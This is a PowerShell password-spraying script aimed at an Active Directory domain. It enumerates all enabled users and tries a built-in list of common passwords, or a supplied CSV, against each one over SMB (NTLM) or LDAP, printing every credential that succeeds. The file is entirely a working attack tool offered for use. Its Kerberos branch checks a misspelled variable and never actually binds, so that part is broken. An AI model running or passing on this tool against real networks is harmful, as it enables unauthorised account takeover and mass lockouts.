Param
 (
    $Domain = 'na.trd.com',
    $AuthType = 'NTLM',
    $PasswordFile
 )

$DomainDCInfo = Get-ADDomainController -Discover -DomainName $Domain
$DomainDC = $DomainDCInfo.Name
$DomainDCIP = $DomainDCInfo.IPv4Address
[array]$DomainInfo = Get-ADDomain -Server $DomainDC
$DomainInfoDNS = $DomainInfo.DNSRoot

$RemotePath = "\\$DomainInfoDNS\SYSVOL"

IF (!$PasswordFile)
 { [array]$PasswordArray = @('Password99!','ThisIsASecurePassword!','Password1234!') }
IF ($PasswordFile)
 { [array]$PasswordArray = Import-CSV $PasswordFile }

[array]$UserAccountArray = Get-ADUser -Filter * | Where { $_.Enabled -eq $True} 

ForEach ($PasswordArrayItem in $PasswordArray)
 {
    ForEach ($UserAccountArrayItem in $UserAccountArray)
     {
        $username = $DomainInfo.NetBIOSName + '\' + $UserAccountArrayItem.SamAccountName

        Write-Host "Password spraying username $($UserAccountArrayItem.SamAccountName) with password $PasswordArrayItem"

        IF ($AuthType -eq 'NTLM')
          { 
            TRY
             {
                $output = @()
                $password = ConvertTo-SecureString $PasswordArrayItem -AsPlainText -Force
                $cred = New-Object System.Management.Automation.PSCredential($username, $password)
                $output = New-SmbMapping -RemotePath $RemotePath -Credential $cred -ErrorAction Stop
                Remove-SmbMapping -RemotePath $RemotePath -Force
                IF ($output)
                 { write-host "$($UserAccountArrayItem.SamAccountName) Password is $PasswordArrayItem" -ForegroundColor Cyan }
             }
            CATCH
             { write-verbose "Password is incorrect" }
          }
        
        IF ($AuthType -eq 'Kerberos')
          { 
            TRY
             { 
                $output = @()
                $Ouput = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$($DomainInfo.DistinguishedName)",$username,$PasswordArrayItem) 
                IF ($output)
                 { write-host "$($UserAccountArrayItem.SamAccountName) Password is $PasswordArrayItem" -ForegroundColor Cyan }
             }
            CATCH 
             { write-verbose "Password is incorrect" }
          }
     }
    # Start-Sleep -Seconds 300
 }

# net use [driveletter:] \\servername\sharename [password] /user:[domain\]username [/persistent:yes|no]
#  Get-SMBMapping
#  remove-smbmapping